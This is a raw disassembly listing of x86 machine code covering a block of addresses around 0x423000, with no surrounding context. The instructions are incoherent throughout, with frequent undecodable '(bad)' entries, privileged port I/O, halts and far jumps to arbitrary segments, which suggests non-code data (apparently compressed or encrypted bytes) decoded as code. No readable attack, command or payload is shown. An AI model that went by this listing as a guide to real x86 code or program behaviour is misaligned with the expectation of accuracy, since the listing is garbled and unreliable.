  422f87:	dec    ebp
  422f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f89:	or     BYTE PTR [edx-0x6a],0x33
  422f8d:	lock popf 
  422f8f:	adc    dh,BYTE PTR [edi]
  422f91:	imul   esi,DWORD PTR ds:0xef386635,0xffffffab
  422f98:	data16 sub al,0xb9
  422f9b:	je     0x422fb7
  422f9d:	mov    esi,0xec1102a9
  422fa2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fa4:	pop    eax
  422fa5:	jecxz  0x422f78
  422fa7:	mul    DWORD PTR [eax-0x68]
  422faa:	stos   DWORD PTR es:[edi],eax
  422fab:	ins    DWORD PTR es:[edi],dx
  422fac:	pushf  
  422fad:	(bad)  
  422fae:	fimul  WORD PTR [ebx-0x3d357b36]
  422fb4:	cli    
  422fb5:	mov    esi,esp
  422fb7:	or     eax,0xffffff9a
  422fba:	repz imul eax,DWORD PTR [edx+edi*8],0x93a2ab38
  422fc2:	pop    edx
  422fc3:	fsub   QWORD PTR [edx+0x7b]
  422fc6:	ror    edx,1
  422fc8:	test   eax,0x330cd4c6
  422fcd:	ret    
  422fce:	add    BYTE PTR gs:[ebp+0x16254930],dh
  422fd5:	jae    0x422ffe
  422fd7:	sub    eax,0xe93758ea
  422fdc:	frstor [esi+0x0]
  422fdf:	add    BYTE PTR [eax],al
  422fe1:	add    BYTE PTR [edi],cl
  422fe3:	pop    ebx
  422fe4:	test   BYTE PTR [esi],dl
  422fe6:	aam    0xdf
  422fe8:	lahf   
  422fe9:	pop    ebx
  422fea:	dec    ebp
  422feb:	sar    ebx,cl
  422fed:	adc    ecx,DWORD PTR [edx]
  422fef:	retf   
  422ff0:	sbb    edi,DWORD PTR [ecx]
  422ff2:	jne    0x422f9d
  422ff4:	add    DWORD PTR [eax],eax
  422ff6:	hlt    
  422ff7:	add    al,0x0
  422ff9:	add    BYTE PTR [ecx],bh
  422ffb:	inc    ecx
  422ffc:	shl    edx,0x41
  422fff:	and    DWORD PTR [esi+edx*4-0x7018225],eax
  423006:	mov    cl,0xbe
  423008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423009:	mov    eax,ds:0x32d26e9f
  42300e:	out    0xee,eax
  423010:	stos   BYTE PTR es:[edi],al
  423011:	out    0xd3,al
  423013:	or     ah,bl
  423015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423016:	mov    edi,0x17bcca28
  42301b:	pop    esp
  42301c:	mov    esp,0xded95e0f
  423021:	maxps  xmm3,xmm6
  423024:	mov    cl,0x39
  423026:	mov    eax,0x540a82b3
  42302b:	je     0x422ff2
  42302d:	xor    DWORD PTR [edi-0x14915b2c],esi
  423033:	inc    esp
  423034:	xchg   esp,eax
  423035:	pushf  
  423036:	push   eax
  423037:	pop    edx
  423038:	aaa    
  423039:	dec    ecx
  42303a:	push   esp
  42303b:	fwait
  42303c:	mov    ah,BYTE PTR [ebp-0x3080a5f8]
  423042:	mov    dl,0xf3
  423044:	pop    esi
  423045:	or     ebp,DWORD PTR [edi-0xb]
  423048:	int3   
  423049:	mov    al,ds:0x5a1cec48
  42304e:	mov    bl,0x98
  423050:	jae    0x4230af
  423052:	jp     0x423040
  423054:	rcr    DWORD PTR [ecx+ebx*2],cl
  423057:	ja     0x422fea
  423059:	dec    eax
  42305a:	or     DWORD PTR [esi-0x13],esi
  42305d:	mov    eax,0xd295433
  423062:	xor    al,0xc
  423064:	(bad)  
  423066:	daa    
  423067:	push   ebp
  423068:	mov    edx,0x37c4ada8
  42306d:	cwde   
  42306e:	pop    ebx
  42306f:	cmc    
  423070:	push   edi
  423071:	jl     0x4230af
  423073:	add    DWORD PTR [edi-0x67],ecx
  423076:	ins    DWORD PTR es:[edi],dx
  423077:	pop    es
  423078:	pop    edx
  423079:	js     0x42307b
  42307b:	fild   QWORD PTR [eax]
  42307d:	adc    ebp,ecx
  42307f:	cli    
  423080:	cmp    edx,DWORD PTR [edi+0x1c]
  423083:	ret    
  423084:	jns    0x42300f
  423086:	imul   edx,DWORD PTR [ecx+0x7e],0xffffffda
  42308a:	and    ah,bl
  42308c:	loope  0x423012
  42308e:	xchg   ebx,eax
  42308f:	mov    ch,0xf5
  423091:	cmp    BYTE PTR [ebp+0x38006d61],ah
  423097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423098:	mov    ds:0x31af7a9a,eax
  42309d:	popf   
  42309e:	xchg   esp,eax
  42309f:	xor    eax,0xb4b3dd45
  4230a4:	mov    dl,0x44
  4230a6:	sub    eax,0xe8515ecc
  4230ab:	fwait
  4230ac:	add    esp,esp
  4230ae:	fcomip st,st(6)
  4230b0:	jbe    0x423048
  4230b2:	js     0x423106
  4230b4:	mov    ebx,0xf01d8260
  4230b9:	mov    dh,0x90
  4230bb:	es jle 0x423124
  4230be:	xor    DWORD PTR [ebx],0xa9dac35c
  4230c4:	jge    0x423049
  4230c6:	call   0x602:0xe6bb4d5d
  4230cd:	jnp    0x42313e
  4230cf:	aad    0xb5
  4230d1:	mov    ch,0x93
  4230d3:	imul   ecx,DWORD PTR [edx],0x4e6f698b
  4230d9:	scas   eax,DWORD PTR es:[edi]
  4230da:	loop   0x4230c7
  4230dc:	push   edi
  4230dd:	pushf  
  4230de:	push   edx
  4230df:	fcomp  DWORD PTR [ecx]
  4230e1:	es stos DWORD PTR es:[edi],eax
  4230e3:	in     eax,dx
  4230e4:	hlt    
  4230e5:	fadd   QWORD PTR [ebx]
  4230e7:	(bad)  
  4230e8:	scas   al,BYTE PTR es:[edi]
  4230e9:	fiadd  DWORD PTR [edi-0x68864fbf]
  4230ef:	ds jne 0x4230f2
  4230f2:	pop    esp
  4230f3:	aad    0xeb
  4230f5:	cmp    DWORD PTR [ebx+0x1e1f7987],ebp
  4230fb:	xor    al,0xe6
  4230fd:	cmp    al,0x69
  4230ff:	dec    ebx
  423100:	adc    ecx,DWORD PTR [ecx-0x3e]
  423103:	cld    
  423104:	push   edi
  423105:	pop    esp
  423106:	sbb    DWORD PTR [edi],edx
  423108:	mov    eax,0x6f991202
  42310d:	rcl    BYTE PTR [edi+0x73],cl
  423110:	mov    bl,0x90
  423112:	cld    
  423113:	sub    edx,edx
  423115:	add    eax,0xbfaf1cba
  42311a:	mov    DWORD PTR [edx+0xe418a00],0xc6088a13
  423124:	mov    edi,0x7ae42ef6
  423129:	sahf   
  42312a:	fnstenv [edi+0x21f721d]
  423130:	addr16 add al,0x9f
  423133:	outs   dx,DWORD PTR ds:[esi]
  423134:	jge    0x423141
  423136:	mov    ebp,0x816a5b4e
  42313b:	add    ah,dl
  42313d:	sbb    ebx,DWORD PTR [edi]
  42313f:	stos   BYTE PTR es:[edi],al
  423140:	and    dl,BYTE PTR [esi+0x7b]
  423143:	or     BYTE PTR [ebx+0x7d],0xf8
  423147:	pusha  
  423148:	pop    esi
  423149:	mov    dh,bh
  42314b:	loop   0x423150
  42314d:	daa    
  42314e:	je     0x4230d6
  423150:	mov    ecx,0xd9c678e2
  423155:	xchg   edx,eax
  423156:	lods   eax,DWORD PTR ds:[esi]
  423157:	mov    ebp,0xe7ebaf3d
  42315c:	rcl    DWORD PTR [edx],0x9d
  42315f:	bound  esi,QWORD PTR [esi-0x6]
  423162:	adc    al,0x4a
  423164:	push   eax
  423165:	add    DWORD PTR [edx+0x4556e00],ebx
  42316b:	out    dx,al
  42316c:	gs pop ebx
  42316e:	push   esp
  42316f:	(bad)  
  423170:	sti    
  423171:	or     dh,al
  423173:	ins    DWORD PTR es:[edi],dx
  423174:	pop    ebx
  423175:	ficomp DWORD PTR [edx-0x6cf5a519]
  42317b:	inc    ecx
  42317c:	pop    esp
  42317d:	cmp    cl,dl
  42317f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423180:	or     edi,esp
  423182:	stos   BYTE PTR es:[edi],al
  423183:	sub    BYTE PTR [ebp-0xf9192ea],dh
  423189:	dec    edx
  42318a:	ins    DWORD PTR es:[edi],dx
  42318b:	enter  0x33ea,0xae
  42318f:	mov    BYTE PTR [ecx],ch
  423191:	repz sub DWORD PTR [eax+eiz*8+0x138d553e],0xc607344c
  42319d:	mov    dl,0x5b
  42319f:	ror    DWORD PTR [edi+0x2dedba62],0x41
  4231a6:	mov    cl,0x60
  4231a8:	daa    
  4231a9:	sbb    al,0xa9
  4231ab:	loopne 0x423182
  4231ad:	push   ebp
  4231ae:	ja     0x42322e
  4231b0:	adc    eax,esi
  4231b2:	std    
  4231b3:	repnz pushf 
  4231b5:	inc    ecx
  4231b6:	(bad)  
  4231b7:	xor    BYTE PTR [ebp-0x43e139f1],ch
  4231bd:	jle    0x4231dc
  4231bf:	sahf   
  4231c0:	add    DWORD PTR [edi-0x6fac3ff9],edi
  4231c6:	push   ecx
  4231c7:	fcom   st(2)
  4231c9:	mov    dl,0xf4
  4231cb:	xchg   DWORD PTR [edi-0x19],edx
  4231ce:	xor    BYTE PTR [ebx+0x10],al
  4231d1:	mov    ds:0x89ec2b69,al
  4231d6:	loope  0x42315c
  4231d8:	daa    
  4231d9:	out    0x52,al
  4231db:	jmp    0x59340a14
  4231e0:	sbb    dl,BYTE PTR [ebp+0x56e00c39]
  4231e6:	adc    cl,bl
  4231e8:	adc    al,0x4a
  4231ea:	out    0xd7,al
  4231ec:	jns    0x423177
  4231ee:	call   0xdf748d0f
  4231f3:	stos   DWORD PTR es:[edi],eax
  4231f4:	leave  
  4231f5:	cvtps2pi mm7,QWORD PTR [edi-0x1f]
  4231f9:	shl    BYTE PTR [ebp+ebx*8+0x46],1
  4231fd:	hlt    
  4231fe:	std    
  4231ff:	mov    edx,0x41221471
  423205:	xchg   BYTE PTR [edi-0x5975166b],dh
  42320b:	sub    DWORD PTR [ecx+0x3afaac70],0x22992b82
  423215:	pushf  
  423216:	or     DWORD PTR [edx+0x3b],esi
  423219:	sbb    DWORD PTR [ecx],esi
  42321b:	jmp    0x584497c2
  423220:	xchg   esp,eax
  423221:	popf   
  423222:	scas   eax,DWORD PTR es:[edi]
  423223:	cmc    
  423224:	sub    edi,esp
  423226:	mov    dl,0xc
  423228:	sbb    eax,0xaa4684a8
  42322d:	sub    al,0x9e
  42322f:	cmp    eax,0x61e07142
  423234:	cmp    DWORD PTR [edi+0x24],ecx
  423237:	ds mov ecx,0xa027da7b
  42323d:	or     bl,al
  42323f:	cld    
  423240:	mov    esp,0x6294455
  423245:	dec    esi
  423246:	sbb    cl,BYTE PTR ds:0xd62c0b27
  42324c:	pusha  
  42324d:	add    edx,DWORD PTR [esi+eiz*4+0x30]
  423251:	jmp    0x423289
  423253:	loope  0x42324e
  423255:	fnstenv [ecx]
  423257:	ret    0x8def
  42325a:	ret    0xab8b
  42325d:	cdq    
  42325e:	outs   dx,BYTE PTR ds:[esi]
  42325f:	nop
  423260:	leave  
  423261:	jle    0x423204
  423263:	jecxz  0x4231e6
  423265:	inc    ecx
  423266:	in     al,0xfb
  423268:	add    esp,DWORD PTR [edx-0x3cfde650]
  42326e:	sbb    eax,0x438cfdb4
  423273:	xchg   ebp,eax
  423274:	mov    eax,0x34b0e82f
  423279:	mov    al,ds:0xbb7cfa7d
  42327e:	in     al,dx
  42327f:	xor    al,0x31
  423281:	adc    ah,BYTE PTR [ecx]
  423283:	push   edi
  423284:	imul   edx,DWORD PTR [ebx-0x51c69283],0xffffff8a
  42328b:	pop    ss
  42328c:	mov    ch,0xb4
  42328e:	adc    al,0xba
  423290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423291:	pop    ebx
  423292:	aam    0xdc
  423294:	inc    ebx
  423295:	(bad)  
  423296:	and    bh,al
  423298:	sbb    BYTE PTR [ebp+0x47],bl
  42329b:	aad    0x57
  42329d:	dec    edi
  42329e:	mov    ecx,0xe437e34c
  4232a3:	push   edi
  4232a4:	ss daa 
  4232a6:	or     DWORD PTR [edx],ebp
  4232a8:	xor    ecx,edx
  4232aa:	dec    edi
  4232ab:	xchg   esp,eax
  4232ac:	xchg   ebx,eax
  4232ad:	inc    ecx
  4232ae:	retf   
  4232af:	xchg   ecx,eax
  4232b0:	sub    dl,BYTE PTR [ecx+ebp*2-0x7d4f7d8c]
  4232b7:	xchg   edx,eax
  4232b8:	inc    bl
  4232ba:	or     bh,BYTE PTR [edi+0x78914467]
  4232c0:	mov    ch,0x5
  4232c2:	sbb    al,0xe4
  4232c4:	pop    ecx
  4232c5:	or     ebx,DWORD PTR ds:0xf5afb377
  4232cb:	enter  0x9d07,0xea
  4232cf:	mov    ds:0xb5fd79fd,al
  4232d4:	sbb    DWORD PTR [esi+0x54],esp
  4232d7:	jle    0x42327b
  4232d9:	push   esp
  4232da:	and    bl,cl
  4232dc:	sub    ch,dh
  4232de:	in     eax,0xe7
  4232e0:	nop
  4232e1:	push   ss
  4232e2:	pop    ebx
  4232e3:	xchg   BYTE PTR [edx+0x22e1719a],bl
  4232e9:	xor    BYTE PTR [edx*4-0x22b50b08],bh
  4232f0:	sub    eax,0xa8c0be98
  4232f5:	push   ebp
  4232f6:	repz push ss
  4232f8:	jecxz  0x4232a9
  4232fa:	lods   eax,DWORD PTR ds:[esi]
  4232fb:	and    eax,0x22aae26
  423300:	std    
  423301:	mov    edx,0xc4a0c2c
  423306:	lock test al,bl
  423309:	xchg   DWORD PTR [esi],ebp
  42330b:	je     0x4232f4
  42330d:	stos   BYTE PTR es:[edi],al
  42330e:	dec    cl
  423310:	aam    0xb5
  423312:	adc    DWORD PTR [edx+0xb],0x8fa5f947
  423319:	ins    BYTE PTR es:[edi],dx
  42331a:	mov    WORD PTR [ebp+0x1645cd78],gs
  423320:	or     BYTE PTR [eax+0x2d8f8020],0x7f
  423327:	repz mov edx,0x977b74f3
  42332d:	inc    ecx
  42332e:	ja     0x42330e
  423330:	popa   
  423331:	retf   
  423332:	mov    ch,0x8a
  423334:	loopne 0x423304
  423336:	lock lods al,BYTE PTR es:[esi]
  423339:	and    eax,0x30b83723
  42333e:	mov    ecx,edi
  423340:	add    eax,0x8a8a3013
  423345:	mov    esi,0xeaf43c4f
  42334a:	mov    bl,ah
  42334c:	not    BYTE PTR [ebp+0x2c]
  42334f:	out    dx,eax
  423350:	lods   eax,DWORD PTR ds:[esi]
  423351:	(bad)
  423354:	mov    ah,0x56
  423356:	pop    ebx
  423357:	and    eax,0x84fb565f
  42335c:	sub    BYTE PTR [edi],bh
  42335e:	xchg   edi,eax
  42335f:	loopne 0x423325
  423361:	pop    esp
  423362:	fild   WORD PTR [ebx]
  423364:	xor    ebp,DWORD PTR [eax-0x4a35a548]
  42336a:	add    edx,DWORD PTR [esi+ebp*1]
  42336d:	aad    0xa9
  42336f:	sub    edi,edx
  423371:	adc    ah,bl
  423373:	cwde   
  423374:	fnstcw WORD PTR [ebx+esi*4]
  423377:	xchg   BYTE PTR [ecx+0x717295a0],bh
  42337d:	adc    DWORD PTR [eax+0x61f6fbc8],eax
  423383:	in     eax,0xd9
  423385:	sbb    BYTE PTR [esi-0x5b],dl
  423388:	shl    DWORD PTR [ebx-0x706204e1],cl
  42338e:	sub    eax,0x5ff588f8
  423393:	fisub  DWORD PTR [eax-0x3a]
  423396:	mov    ds:0x3f9c4ba7,al
  42339b:	mov    bl,0x11
  42339d:	adc    edi,DWORD PTR [eax]
  42339f:	mov    DWORD PTR [ebp+0x4a04b6e7],edx
  4233a5:	cmp    eax,0x116caf88
  4233aa:	repnz call 0xfcc1:0x8343e906
  4233b2:	call   0x2d5a2f03
  4233b7:	and    ch,al
  4233b9:	adc    edx,DWORD PTR [edx]
  4233bb:	enter  0x65f,0xc5
  4233bf:	clc    
  4233c0:	xchg   ebp,eax
  4233c1:	test   DWORD PTR ds:0xc86ccbfe,ecx
  4233c7:	lods   eax,DWORD PTR ds:[esi]
  4233c8:	add    al,0xbf
  4233ca:	cs mov al,0xca
  4233cd:	cld    
  4233ce:	xchg   ebx,eax
  4233cf:	cmc    
  4233d0:	xor    ebx,DWORD PTR [edi]
  4233d2:	cdq    
  4233d3:	sbb    eax,0xba94d2d7
  4233d8:	pushf  
  4233d9:	scas   eax,DWORD PTR es:[edi]
  4233da:	xor    edi,DWORD PTR [edx]
  4233dc:	and    al,0x47
  4233de:	pop    ebx
  4233df:	cmp    ch,BYTE PTR [ecx]
  4233e1:	mov    esi,0x5a70baa0
  4233e6:	cmp    esp,ebp
  4233e8:	fsubrp st(6),st
  4233ea:	fisttp QWORD PTR [ebx+ebp*4]
  4233ed:	not    BYTE PTR [ebp+0x55a87d16]
  4233f3:	mov    ebx,0x94b773ba
  4233f8:	ret    0x72c1
  4233fb:	repz mul BYTE PTR [ebx+0x3c9d1c0c]
  423402:	test   DWORD PTR [ecx-0x2c],0xea618e0c
  423409:	sahf   
  42340a:	adc    DWORD PTR [esi+0x15da51da],ecx
  423410:	or     al,0x4a
  423412:	cmp    BYTE PTR [eax-0xf],al
  423415:	and    esp,DWORD PTR [ebx+edi*4+0x65]
  423419:	or     al,0xfa
  42341b:	repz std 
  42341d:	mov    ?,WORD PTR [ecx+0x1335396b]
  423423:	pushf  
  423424:	sti    
  423425:	sub    BYTE PTR [ebp+0x23],0x4
  423429:	push   cs
  42342a:	inc    edx
  42342b:	fcomp  QWORD PTR [edi*8-0x4805b507]
  423432:	mov    dl,0xa
  423434:	cmp    al,0xa4
  423436:	in     eax,0xa1
  423438:	add    DWORD PTR [edi],0x11
  42343b:	xchg   ecx,edi
  42343d:	inc    edx
  42343e:	retf   0x752d
  423441:	push   0xffffffd1
  423443:	sub    al,0x42
  423445:	inc    edi
  423446:	pop    edx
  423447:	push   ebx
  423448:	add    eax,0x3845dec0
  42344d:	enter  0x224,0x81
  423451:	retf   
  423452:	in     al,dx
  423453:	jmp    0x8ed1fe43
  423458:	pop    es
  423459:	xor    esi,DWORD PTR [ebx+0x72]
  42345c:	popf   
  42345d:	mov    dh,0xdc
  42345f:	(bad)  
  423460:	or     esi,DWORD PTR [ebx]
  423462:	aas    
  423463:	sub    al,0x98
  423465:	xor    ch,cl
  423467:	dec    esi
  423468:	pusha  
  423469:	sbb    bl,al
  42346b:	stos   DWORD PTR es:[edi],eax
  42346c:	gs lock push cs
  42346f:	mov    edx,DWORD PTR [eax+0x5eba771b]
  423475:	cmp    al,0xc1
  423477:	or     DWORD PTR [edi-0xe],esp
  42347a:	loopne 0x423477
  42347c:	pop    esp
  42347d:	xchg   ecx,eax
  42347e:	shl    ecx,1
  423480:	pop    edi
  423481:	sbb    dl,BYTE PTR [esi-0x1b]
  423484:	je     0x423484
  423486:	loope  0x4234b4
  423488:	outs   dx,BYTE PTR ds:[esi]
  423489:	pop    edx
  42348a:	ja     0x42340f
  42348c:	xor    bh,BYTE PTR [ebx+ebx*1]
  42348f:	xor    BYTE PTR es:[ebx-0x16137dcd],0xff
  423497:	sbb    cl,dl
  423499:	mov    esi,0x68a1786b
  42349e:	push   DWORD PTR [edx+0x1b]
  4234a1:	mov    cl,0x10
  4234a3:	popf   
  4234a4:	retf   
  4234a5:	fdiv   DWORD PTR [eiz*8-0xa2f477d]
  4234ac:	and    eax,0xd708297
  4234b1:	mov    BYTE PTR [ecx-0xe],bh
  4234b4:	mov    esp,0xd9015fe3
  4234b9:	hlt    
  4234ba:	xchg   ebx,eax
  4234bb:	outs   dx,DWORD PTR ds:[esi]
  4234bc:	ffree  st(2)
  4234be:	jle    0x4234fd
  4234c0:	lock pop es
  4234c2:	xchg   esi,eax
  4234c3:	in     al,0x1
  4234c5:	push   es
  4234c6:	lahf   
  4234c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234c8:	pop    es
  4234c9:	inc    ebx
  4234ca:	repz mov al,0xad
  4234cd:	int    0xb5
  4234cf:	xchg   edx,eax
  4234d0:	adc    BYTE PTR [esi+0x1e796e88],cl
  4234d6:	pop    ds
  4234d7:	les    esp,FWORD PTR [eax-0x46]
  4234da:	push   eax
  4234db:	in     al,dx
  4234dc:	inc    edx
  4234dd:	inc    edx
  4234de:	es nop
  4234e0:	mov    ah,0x1
  4234e2:	test   ecx,edx
  4234e4:	jbe    0x423467
  4234e6:	jle    0x423556
  4234e8:	xchg   BYTE PTR es:[ebx-0x5d],ch
  4234ec:	adc    DWORD PTR [ecx+0x0],esi
  4234f2:	dec    ecx
  4234f3:	mov    ds:0xf6ffd655,eax
  4234f8:	retf   
  4234f9:	mov    edi,0x3f1d56c2
  4234fe:	pop    eax
  4234ff:	inc    edi
  423500:	(bad)
  423503:	scas   al,BYTE PTR es:[edi]
  423504:	add    DWORD PTR [eax],eax
  423506:	hlt    
  423507:	add    al,0x0
  423509:	add    BYTE PTR [edi+0x6219060f],bl
  42350f:	lea    edx,[eax]
  423511:	int3   
  423512:	loope  0x4234e4
  423514:	and    eax,DWORD PTR [edx-0x67]
  423517:	or     BYTE PTR [eax],0xb5
  42351a:	jl     0x42352d
  42351c:	jg     0x42356e
  42351e:	pop    ecx
  42351f:	sub    bl,BYTE PTR [ebx+0x73df95f5]
  423525:	push   0x4e
  423527:	add    DWORD PTR ds:0x2a9b4c0e,esi
  42352d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42352e:	hlt    
  42352f:	aaa    
  423530:	jnp    0x42350d
  423532:	stos   DWORD PTR es:[edi],eax
  423533:	sub    edi,DWORD PTR [ebx+eax*4+0x29]
  423537:	sbb    dl,ch
  423539:	pop    esp
  42353a:	rol    esi,cl
  42353c:	mov    BYTE PTR [ecx+0x1a],al
  42353f:	call   0xde353ae0
  423544:	mov    ebx,0x799524d5
  423549:	out    0xc6,eax
  42354b:	aaa    
  42354c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42354e:	call   0xe55e2cbf
  423553:	mov    ecx,0x1469b49b
  423558:	fsub   DWORD PTR [ebx+0x5490ada1]
  42355e:	into   
  42355f:	add    ecx,0xcd951a0e
  423565:	cmp    ah,BYTE PTR [esi-0x12]
  423568:	imul   ecx,DWORD PTR [eax+0x462098e4],0xcea6c0c9
  423572:	push   ebx
  423573:	pop    ebp
  423574:	sbb    esp,DWORD PTR [esi-0x43]
  423577:	lds    ecx,FWORD PTR [edi+0x4e99f278]
  42357d:	imul   eax,DWORD PTR [ebp+0x42ca20c2],0xb5679188
  423587:	les    esi,FWORD PTR [edx+0x6c760a87]
  42358d:	push   es
  42358e:	inc    edx
  42358f:	std    
  423590:	adc    BYTE PTR [edx+edx*4-0x60],ah
  423594:	and    eax,0xdf915927
  423599:	aam    0x19
  42359b:	pop    ebx
  42359c:	cmp    edx,ebx
  42359e:	xchg   ebx,eax
  42359f:	add    esi,DWORD PTR [edi+0x6c47059f]
  4235a5:	push   edx
  4235a6:	lahf   
  4235a7:	xchg   esp,eax
  4235a8:	(bad)  
  4235aa:	leave  
  4235ab:	ror    BYTE PTR [edi*8+0x248dd0ec],1
  4235b2:	push   eax
  4235b3:	jecxz  0x4235ba
  4235b5:	inc    esp
  4235b6:	imul   ebp,esi,0x43b0719c
  4235bc:	mov    bh,0xc7
  4235be:	leave  
  4235bf:	cdq    
  4235c0:	aaa    
  4235c1:	pop    edx
  4235c2:	sar    BYTE PTR [edi+0x2185e779],1
  4235c8:	push   edx
  4235c9:	jp     0x42361c
  4235cb:	xchg   BYTE PTR [esi+0x2],bh
  4235ce:	mov    edx,DWORD PTR [ebx]
  4235d0:	jne    0x4235be
  4235d2:	pushf  
  4235d3:	packsswb mm4,mm7
  4235d6:	push   edx
  4235d7:	fsubr  QWORD PTR [eax+esi*2]
  4235da:	js     0x4235d6
  4235dc:	mov    esp,0x67db22c3
  4235e1:	pop    es
  4235e2:	cmp    eax,0xec20bdb8
  4235e7:	test   ebp,eax
  4235e9:	sub    eax,0x22ac9e96
  4235ee:	mov    dl,0x77
  4235f0:	mov    eax,ds:0x64f3c4e1
  4235f5:	jno    0x423672
  4235f7:	hlt    
  4235f8:	and    DWORD PTR ds:0x5aa80890,edi
  4235fe:	hlt    
  4235ff:	call   0xebd5:0xbbd2e6cd
  423606:	data16 repz (bad) 
  423609:	inc    esp
  42360a:	sbb    DWORD PTR [edi],ebp
  42360c:	in     eax,dx
  42360d:	ins    BYTE PTR es:[edi],dx
  42360e:	jmp    DWORD PTR [ecx+0x6]
  423611:	shl    DWORD PTR [ecx+edi*4-0x55],0x24
  423616:	(bad)  
  423617:	mov    bl,0x37
  423619:	sahf   
  42361a:	jmp    0x423612
  42361c:	call   0xfa2e:0xcb40648b
  423623:	cmp    ah,ah
  423625:	push   ecx
  423626:	lods   eax,DWORD PTR ds:[esi]
  423627:	xchg   DWORD PTR [esi-0x13f8db32],ebp
  42362d:	loopne 0x423618
  42362f:	fbld   TBYTE PTR [ebx]
  423631:	jmp    0x4235cc
  423633:	aad    0x57
  423635:	or     bl,ah
  423637:	in     eax,0xb4
  423639:	ret    
  42363a:	xchg   edx,eax
  42363b:	and    ebx,0x58
  42363e:	ins    BYTE PTR es:[di],dx
  423640:	cmc    
  423641:	jae    0x423670
  423643:	push   ss
  423644:	cs int3 
  423646:	enter  0x7cfc,0xf1
  42364a:	clc    
  42364b:	rcr    BYTE PTR [ebx],cl
  42364d:	lahf   
  42364e:	call   ebx
  423650:	into   
  423651:	or     cl,BYTE PTR ds:0x2397f4a7
  423657:	jp     0x4236bb
  423659:	push   ss
  42365a:	and    ebx,ebp
  42365c:	pop    edi
  42365d:	xor    eax,0xd8ada60b
  423662:	and    BYTE PTR [ecx],bl
  423664:	stos   BYTE PTR es:[edi],al
  423665:	repnz sub ah,ah
  423668:	repnz adc edx,ecx
  42366b:	cli    
  42366c:	aaa    
  42366d:	mul    BYTE PTR [esp+ebx*4]
  423670:	sbb    al,0x67
  423672:	mov    esi,DWORD PTR [esi+0x60dc3392]
  423678:	xchg   DWORD PTR [esi],edx
  42367a:	pusha  
  42367b:	dec    ebp
  42367c:	xlat   BYTE PTR ds:[ebx]
  42367d:	clc    
  42367e:	cmp    dh,BYTE PTR [ecx]
  423680:	xchg   esp,eax
  423681:	test   al,0xad
  423683:	pusha  
  423684:	add    al,0x51
  423686:	cmc    
  423687:	stos   BYTE PTR es:[edi],al
  423688:	(bad)  
  423689:	fcom   DWORD PTR [ebp-0x53]
  42368c:	mov    cl,bh
  42368e:	add    ah,BYTE PTR [ebx]
  423690:	or     ebp,DWORD PTR [edi-0x48]
  423693:	inc    ebp
  423694:	jmp    0xc3ee:0x5fec28da
  42369b:	and    BYTE PTR [edi+esi*4+0x64d9693b],0x23
  4236a3:	dec    ecx
  4236a4:	add    cl,BYTE PTR [ebx]
  4236a6:	loope  0x423666
  4236a8:	inc    ebx
  4236a9:	fild   QWORD PTR [eax-0x50e84af4]
  4236af:	adc    dl,0x7c
  4236b2:	sub    al,0x31
  4236b4:	scas   al,BYTE PTR es:[edi]
  4236b5:	adc    esi,esp
  4236b7:	mov    ah,0xa4
  4236b9:	sub    BYTE PTR [ecx],bh
  4236bb:	call   edx
  4236bd:	imul   ebp,DWORD PTR [ecx],0xffffffd6
  4236c0:	inc    ebp
  4236c1:	in     al,0x8f
  4236c3:	mov    dh,0xc6
  4236c5:	push   es
  4236c6:	(bad)  [edi+0x4c]
  4236c9:	mov    WORD PTR [edi+ebx*1-0x73],ss
  4236cd:	(bad)  
  4236ce:	sub    dh,BYTE PTR [edi+0x5b]
  4236d1:	pop    eax
  4236d2:	mov    BYTE PTR [ebx],cl
  4236d4:	push   ebp
  4236d5:	mov    ds:0x9bc39eb2,eax
  4236da:	out    dx,al
  4236db:	ror    BYTE PTR [esi+0x55e8dc6e],cl
  4236e1:	xchg   edi,eax
  4236e2:	jo     0x423762
  4236e4:	mov    ecx,0x40790484
  4236e9:	dec    esp
  4236ea:	aad    0x52
  4236ec:	rcl    BYTE PTR [edi],0x30
  4236ef:	mov    esi,0xa47b8d16
  4236f4:	sbb    ebp,DWORD PTR [ebx-0x22]
  4236f7:	mov    fs:0xc0f3d96b,al
  4236fd:	adc    dh,ch
  4236ff:	scas   al,BYTE PTR es:[edi]
  423700:	pop    ebp
  423701:	xchg   esi,eax
  423702:	aas    
  423703:	xchg   bx,ax
  423705:	pusha  
  423706:	push   ss
  423707:	rol    DWORD PTR [esi+0x5d],0xec
  42370b:	dec    ebp
  42370c:	sub    dh,BYTE PTR [esi+0x5cec2b14]
  423712:	mov    esp,0x580c12ad
  423717:	mov    BYTE PTR ss:[esi+0x2f1e7a7b],bl
  42371e:	fidiv  DWORD PTR [eax+edi*4]
  423721:	pop    ebx
  423722:	rol    BYTE PTR [edi+0x49f85030],cl
  423728:	cld    
  423729:	cmp    esi,esi
  42372b:	sbb    edx,esi
  42372d:	xor    al,0xbf
  42372f:	mov    ds:0xf9e272ee,eax
  423734:	push   ds
  423735:	fist   DWORD PTR [ebp-0x4d]
  423738:	bound  edx,QWORD PTR [edx]
  42373a:	dec    edi
  42373b:	jl     0x4236e2
  42373d:	mov    bl,0x88
  42373f:	adc    al,0xa3
  423741:	jg     0x4237a3
  423743:	sbb    eax,0xd5084f52
  423748:	cmp    eax,0x87ba8b67
  42374d:	and    esp,DWORD PTR [eax+0x20]
  423750:	add    eax,0x243d746
  423755:	dec    esi
  423756:	mov    dl,0xdb
  423758:	mov    ah,0x27
  42375a:	(bad)  
  42375c:	(bad)  [eax-0x1f]
  42375f:	cld    
  423760:	arpl   WORD PTR [ebp+0x25],cx
  423763:	(bad)  
  423764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423765:	jns    0x423769
  423767:	mov    cl,0xd0
  423769:	retf   
  42376a:	jae    0x423729
  42376c:	je     0x423784
  42376e:	pushfw 
  423770:	(bad)  
  423771:	adc    al,0x73
  423773:	sbb    esi,esi
  423775:	sar    BYTE PTR [esi+0x47],0xe8
  423779:	(bad)  
  42377a:	add    ch,BYTE PTR [eax]
